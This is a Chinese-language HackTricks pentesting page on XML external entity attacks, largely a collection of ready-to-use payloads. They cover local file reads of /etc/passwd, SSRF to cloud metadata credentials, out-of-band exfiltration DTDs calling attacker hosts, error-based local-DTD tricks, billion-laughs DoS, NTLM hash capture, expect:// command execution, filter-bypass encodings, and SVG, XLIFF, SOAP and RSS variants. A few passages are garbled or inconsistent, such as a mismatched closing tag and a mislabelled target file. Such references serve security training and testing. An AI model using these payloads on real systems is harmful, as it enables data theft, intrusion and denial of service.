# XXE - XEE - XML外部实体

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

XML外部实体攻击是针对解析XML输入的应用程序的一种攻击类型。

## XML基础知识

**大部分内容基于这个出色的Portswigger页面：** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### 可扩展标记语言概述 <a href="#overview-of-extensible-markup-language" id="overview-of-extensible-markup-language"></a>

可扩展标记语言，通常简称为XML，被定义为一种用于存储和传输数据的标记语言。XML采用类似HTML的树状结构，由标记和数据组成，与HTML不同的是，XML不限制于预定义标记。这种灵活性允许使用根据其封装数据的描述性命名的标记。在历史上，XML作为数据传输格式而备受推崇，尤其以其对“AJAX”（其中“X”代表“XML”）的贡献而闻名。然而，随着JSON成为首选格式，XML的流行度有所下降。

### 通过实体在XML中表示数据项 <a href="#representation-of-data-items-in-xml-through-entities" id="representation-of-data-items-in-xml-through-entities"></a>

在XML中，实体用作表示文档中数据项的机制，提供了一种替代直接插入数据的方法。XML规范包含各种内置实体。例如，`&lt;`和`&gt;`用于分别表示`<`和`>`字符。由于它们在标记XML标签方面的作用，这些元字符在数据中出现时通常必须使用实体来表示。

### 定义XML元素

在XML中，元素类型声明至关重要，因为它们为XML文档中元素的存在、类型和顺序建立了准则。举例说明包括：

- `<!ELEMENT stockCheck ANY>` 表示`<stockCheck></stockCheck>`元素可以包含任何类型的对象。
- `<!ELEMENT stockCheck EMPTY>` 指示`<stockCheck></stockCheck>`元素应保持无内容。
- `<!ELEMENT stockCheck (productId,storeId)>` 指定`<stockCheck>`元素只能包含`<productId>`和`<storeId>`作为子元素。

### 文档类型定义简介 <a href="#introduction-to-document-type-definition" id="introduction-to-document-type-definition"></a>

文档类型定义（DTD）通过提供声明来规定XML文档的结构、允许的数据类型等，在XML中发挥着关键作用。`DOCTYPE`元素是可选的，位于XML文档开头，可以声明一个DTD。DTD可以分为“内部”（完全嵌入在文档中）、“外部”（从外部源加载）或两者结合的形式。

### 在XML中使用自定义实体 <a href="#utilization-of-custom-entities-in-xml" id="utilization-of-custom-entities-in-xml"></a>

XML允许在DTD中定义自定义实体。一个示例声明：

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

这样的声明表明文档中的实体引用`&myentity;`将替换为“my entity value”。

### 在XML中引入外部实体 <a href="#incorporation-of-external-entities-in-xml" id="incorporation-of-external-entities-in-xml"></a>

XML中的外部实体是自定义实体的一个子类型，其定义位于DTD之外。这些实体使用`SYSTEM`关键字，并需要指定一个URL，该URL指定实体值的获取位置，从而可能实现[XML外部实体攻击](https://portswigger.net/web-security/xxe)。

### 利用XML参数实体进行XXE检测

在标准实体无法利用XXE漏洞进行攻击的情况下，由于验证或XML解析器加固，可以使用XML参数实体。XML参数实体以百分号字符作为实体名称之前的标志，并使用相同字符引用，仅在DTD中引用。它们可以通过带外方法促成盲目XXE检测，例如发起DNS查找和HTTP请求到攻击者控制的域，从而确认攻击的成功。


## 主要攻击

**[大部分这些攻击是使用出色的Portswiggers XEE实验室进行测试的：https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### 新实体测试

在这次攻击中，我将测试一个简单的新实体声明是否有效。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### 读取文件

让我们尝试以不同的方式读取 `/etc/passwd` 文件。对于Windows，您可以尝试读取：`C:\windows\system32\drivers\etc\hosts`

在这种情况下，请注意SYSTEM "_\*\*file:///\*\*etc/passwd_" 也可以工作。
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
这第二种情况应该对提取文件很有用，如果Web服务器正在使用PHP（不是Portswiggers实验的情况）。
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
在这第三个案例中，请注意我们将`Element stockCheck`声明为ANY。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
### 目录列表

在基于**Java**的应用程序中，可以通过类似以下负载的XXE来**列出目录的内容**（仅请求目录而非文件）：
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE可能被用来滥用云中的SSRF
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### 盲 SSRF

使用**先前评论的技术**，您可以让服务器访问您控制的服务器以显示其存在漏洞。但是，如果这种方法不起作用，可能是因为**不允许使用 XML 实体**，在这种情况下，您可以尝试使用**XML 参数实体**：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "盲" SSRF - 通过带外数据泄露

**在这种情况下，我们将让服务器加载一个带有恶意有效负载的新DTD，该有效负载将通过HTTP请求发送文件的内容（对于多行文件，您可以尝试通过** _**ftp://**_**进行泄露）。此说明摘自** [**Portswiggers实验室这里**](https://portswigger.net/web-security/xxe/blind)**。**

一个用于泄露`/etc/hostname`文件内容的恶意DTD示例如下：
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
这个DTD执行以下步骤：

* 定义一个名为 `file` 的XML参数实体，包含 `/etc/passwd` 文件的内容。
* 定义一个名为 `eval` 的XML参数实体，包含对另一个名为 `exfiltrate` 的XML参数实体的动态声明。`exfiltrate` 实体将通过向攻击者的Web服务器发起HTTP请求来评估 `file` 实体的值，该请求将在URL查询字符串中包含。
* 使用 `eval` 实体，导致对 `exfiltrate` 实体的动态声明被执行。
* 使用 `exfiltrate` 实体，使其值通过请求指定的URL来评估。

攻击者必须将恶意的DTD托管在他们控制的系统上，通常是通过将其加载到自己的Web服务器上。例如，攻击者可能会在以下URL上提供恶意的DTD：\
`http://web-attacker.com/malicious.dtd`

最后，攻击者必须向易受攻击的应用程序提交以下XXE有效载荷：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
这个XXE负载声明了一个名为`xxe`的XML参数实体，然后在DTD中使用这个实体。这将导致XML解析器从攻击者的服务器获取外部DTD并内联解释它。恶意DTD中定义的步骤将被执行，`/etc/passwd`文件将被传输到攻击者的服务器。

### 基于错误的(外部DTD)

**在这种情况下，我们将让服务器加载一个恶意的DTD，该DTD将在错误消息中显示文件的内容（仅当您可以看到错误消息时才有效）。** [**示例在这里。**](https://portswigger.net/web-security/xxe/blind)

您可以使用恶意的外部DTD触发包含`/etc/passwd`文件内容的XML解析错误消息，如下所示：
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
这个DTD执行以下步骤：

* 定义一个名为 `file` 的XML参数实体，包含 `/etc/passwd` 文件的内容。
* 定义一个名为 `eval` 的XML参数实体，包含另一个名为 `error` 的XML参数实体的动态声明。`error` 实体将通过加载一个包含 `file` 实体值的不存在文件来进行评估。
* 使用 `eval` 实体，导致执行 `error` 实体的动态声明。
* 使用 `error` 实体，使其值通过尝试加载不存在的文件进行评估，导致包含不存在文件名的错误消息，该文件名是 `/etc/passwd` 文件的内容。

调用外部DTD错误：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### **基于错误的 (system DTD)**

那么当**阻止带外交互**（外部连接不可用）时，盲目 XXE 漏洞如何处理呢？

XML 语言规范中的一个漏洞可以通过错误消息**暴露敏感数据**，当文档的 DTD 混合了内部和外部声明时。这个问题允许在内部重新定义在外部声明的实体，促进基于错误的 XXE 攻击的执行。这种攻击利用了在内部 DTD 中重新定义 XML 参数实体，最初在外部 DTD 中声明。当服务器阻止带外连接时，攻击者必须依赖本地 DTD 文件来进行攻击，旨在诱发解析错误以揭示敏感信息。

考虑一个场景，服务器的文件系统包含一个位于 `/usr/local/app/schema.dtd` 的 DTD 文件，定义了一个名为 `custom_entity` 的实体。攻击者可以通过提交以下混合 DTD 来诱发 XML 解析错误，从而揭示 `/etc/passwd` 文件的内容：
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
以下是由此DTD执行的步骤：

- 定义了一个名为`local_dtd`的XML参数实体，其中包含位于服务器文件系统上的外部DTD文件。
- 对`custom_entity` XML参数实体进行重新定义，最初在外部DTD中定义，以封装一个[基于错误的XXE利用](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)。这种重新定义旨在引发解析错误，从而暴露`/etc/passwd`文件的内容。
- 通过使用`local_dtd`实体，启用了外部DTD，包含了新定义的`custom_entity`。这一系列操作导致了利用所针对的错误消息的发出。

**真实世界示例：** 使用GNOME桌面环境的系统通常在`/usr/share/yelp/dtd/docbookx.dtd`中包含一个名为`ISOamso`的实体。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

由于这种技术使用**内部 DTD，您首先需要找到一个有效的 DTD**。您可以通过**安装**与服务器相同的**操作系统/软件**，并**搜索一些默认的 DTD**，或者**获取系统中默认 DTD 的列表**，然后**检查**是否存在任何一个：
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
更多信息请查看[https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### 在系统中查找DTDs

在以下令人敬畏的github存储库中，您可以找到**可能存在于系统中的DTDs的路径**：

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

此外，如果您有**受害系统的Docker镜像**，您可以使用相同存储库中的工具来**扫描**该**镜像**并**查找**系统中存在的**DTDs**的路径。阅读[github的Readme](https://github.com/GoSecure/dtd-finder)以了解详情。
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### 通过 Office Open XML 解析器进行 XXE 攻击

要了解这种攻击的更深入解释，请查看 Detectify 的[这篇精彩文章](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/)的第二部分。

许多 Web 应用程序提供了上传 Microsoft Office 文档的功能，然后从这些文档中提取某些详细信息。例如，Web 应用程序可能允许用户通过上传 XLSX 格式的电子表格来导入数据。为了从电子表格中提取数据，解析器必然需要解析至少一个 XML 文件。

要测试此漏洞，需要创建一个包含 XXE 负载的 Microsoft Office 文件。第一步是创建一个空目录，以便可以将文档解压缩到其中。

文档解压缩后，应打开位于 `./unzipped/word/document.xml` 的 XML 文件，并在首选文本编辑器（如 vim）中进行编辑。应修改 XML 以包含所需的 XXE 负载，通常以 HTTP 请求开头。

修改后的 XML 行应插入在两个根 XML 对象之间。重要的是将 URL 替换为可监控请求的 URL。

最后，可以将文件压缩为恶意 poc.docx 文件。从先前创建的 "unzipped" 目录中，应运行以下命令：

现在，可以将创建的文件上传到可能存在漏洞的 Web 应用程序中，并希望在 Burp Collaborator 日志中出现请求。


### Jar 协议

`jar` 协议仅适用于 Java 应用程序。它允许访问 PKZIP 文件（`.zip`、`.jar` 等）中的文件，并适用于本地和远程文件。
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
访问 PKZIP 文件内部的文件对于通过系统 DTD 文件滥用 XXE 非常有用。查看[此部分以了解如何滥用系统 DTD 文件](xxe-xee-xml-external-entity.md#error-based-system-dtd)。
{% endhint %}

#### 幕后

1. 发起 HTTP 请求以加载 zip 存档。`https://download.host.com/myarchive.zip`
2. 将 HTTP 响应保存到临时位置。`/tmp/...`
3. 解压存档。
4. 读取 `file.zip`
5. 删除临时文件。

请注意，可以在第二步中停止流程。技巧是在提供文件时永远不要关闭连接。[这些工具可能会有所帮助](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution)：一个是 Python 中的 `slow_http_server.py`，另一个是 Java 中的 `slowserver.jar`。

一旦服务器下载了您的文件，您需要通过浏览临时目录来找到其位置。由于路径是随机的，因此无法提前预测文件路径。

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
将文件写入临时目录可以帮助**升级涉及路径遍历的另一个漏洞**（例如本地文件包含、模板注入、XSLT RCE、反序列化等）。
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### 十亿笑攻击
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml 攻击
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### 二次方爆炸攻击

![](<../.gitbook/assets/image (531).png>)

#### 获取 NTML

在 Windows 主机上，可以通过设置 responder.py 处理程序来获取 Web 服务器用户的 NTML 哈希值：
```
Responder.py -I eth0 -v
```
通过发送以下请求
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## 隐藏的XXE表面

### XInclude

在某些情况下，**客户端发送的数据在解析之前会被服务器端处理并合并到一个XML文档中**。这通常发生在客户端数据被整合到一个**后端SOAP请求**中，随后由后端的SOAP服务处理。

在这些情况下，执行传统的XXE（XML外部实体）攻击变得具有挑战性，因为对XML文档整体的控制受限，特别是无法修改或引入`DOCTYPE`元素。然而，利用`XInclude`，这是XML标准的一个功能，它允许从较小的子文档组装一个XML文档，提供了一种解决方法。这种方法允许在XML文档的任何数据元素中进行`XInclude`攻击，在服务器生成的XML文档中嵌入数据的控制受限的情况下也是可行的。

要发起一个`XInclude`攻击，需要包含`XInclude`命名空间，并指定用于包含的文件路径。以下示例演示了如何构建这样一种攻击：
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
查看[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)获取更多信息！

### SVG - 文件上传

用户上传到某些应用程序的文件，然后在服务器上进行处理，可能会利用处理 XML 或包含 XML 的文件格式的漏洞。常见的文件格式如办公文档（DOCX）和图像（SVG）都是基于 XML 的。

当用户**上传图像**时，这些图像会在服务器端进行处理或验证。即使是期望 PNG 或 JPEG 等格式的应用程序，**服务器的图像处理库也可能支持 SVG 图像**。SVG 作为基于 XML 的格式，可以被攻击者利用来提交恶意 SVG 图像，从而使服务器暴露于 XXE（XML External Entity）漏洞。

下面展示了这种利用的示例，其中恶意 SVG 图像尝试读取系统文件：
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
另一种方法涉及尝试通过 PHP 的 "expect" 包装器执行命令：
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
在这两种情况下，SVG 格式被用来发动攻击，利用服务器软件的 XML 处理能力，突显了对强大的输入验证和安全措施的需求。

查看[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)获取更多信息！

**请注意读取文件的第一行或执行结果将出现在创建的图像内部。因此，您需要能够访问 SVG 创建的图像。**

### **PDF - 文件上传**

阅读以下文章以**学习如何利用 XXE 上传 PDF 文件**：

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: 从 x-www-urlencoded 到 XML

如果 POST 请求接受 XML 格式的数据，您可以尝试在该请求中利用 XXE。例如，如果正常请求包含以下内容：
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
然后您可能能够提交以下请求，结果相同：
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: 从 JSON 到 XEE

要更改请求，您可以使用一个名为“**Content Type Converter**”的 Burp 扩展。[在这里](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html)您可以找到这个示例：
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
另一个示例可以在[这里](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2)找到。

## WAF & Protections Bypasses

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
这仅在XML服务器接受`data://`协议时才有效。

### UTF-7

您可以在此处使用\[**CyberChef的“编码配方”**](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)将其转换为UTF-7。
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### 文件:/ 协议绕过

如果网站使用 PHP，可以使用 **php wrappers** `php://filter/convert.base64-encode/resource=` 来**访问内部文件**，而不是使用 `file:/`。

如果网站使用 Java，您可以查看[**jar: 协议**](xxe-xee-xml-external-entity.md#jar-protocol)。

### HTML 实体

来自 [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
您可以创建一个**实体内部的实体**，使用**html实体**对其进行编码，然后调用它来**加载一个dtd**。\
请注意，所使用的**HTML实体**需要是**数字**的（例如\[在这个例子中]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C))。
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD 示例：

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP包装器

### Base64

**提取** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **提取外部资源**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### 远程代码执行

**如果加载了 PHP 的 "expect" 模块**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

### **XML External Entity (XEE) Attack**

XML External Entity (XXE) attacks occur when an attacker is able to inject malicious XML content into an XML document processed by a web application. This can lead to sensitive data exposure, server-side request forgery (SSRF), and other security risks.

#### **Detecting XEE Vulnerabilities**

To detect XEE vulnerabilities, you can send a SOAP request with a malicious XML payload containing an external entity reference. If the application processes the external entity and includes sensitive information in its response, the vulnerability is present.

#### **Exploiting XEE Vulnerabilities**

Exploiting XEE vulnerabilities involves crafting a malicious XML payload that includes an external entity pointing to a file or system resource containing sensitive data. By manipulating the XML content, an attacker can retrieve this data through the application's response.

#### **Preventing XEE Attacks**

To prevent XEE attacks, ensure that XML parsing libraries are configured securely to disable external entity processing. Additionally, input validation and sanitization should be implemented to filter out any potentially malicious XML content before processing.
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

本节内容摘自 [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)\
根据 [维基百科](https://en.wikipedia.org/wiki/XLIFF) 的描述：

> XLIFF（XML Localization Interchange File Format）是一种基于 XML 的双文本格式，旨在标准化本地化数据在本地化过程中在工具之间传递的方式，以及 CAT 工具交换的常见格式。

### 盲目请求
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
服务器响应出现错误：
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
但我们在Burp Collaborator上收到了一个命中。

### 通过带外数据泄露数据
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
根据Burp Collaborator返回的显示的用户代理，看起来它正在使用**Java 1.8**。在利用这个Java版本的XXE时的一个问题是，**我们无法使用带有`New Line`的文件**，比如使用Out of Band技术获取包含`/etc/passwd`的文件。

### 通过基于错误的方法外泄数据

DTD文件:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
服务器响应:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
非存在的文件在错误消息中反映出来。接下来是添加文件内容。

DTD 文件：
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
并且文件内容成功**在通过HTTP发送的错误输出中打印出来**。

## RSS - XEE

包含RSS格式的有效XML以利用XXE漏洞。

### 回显

向攻击者服务器发送简单的HTTP请求
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
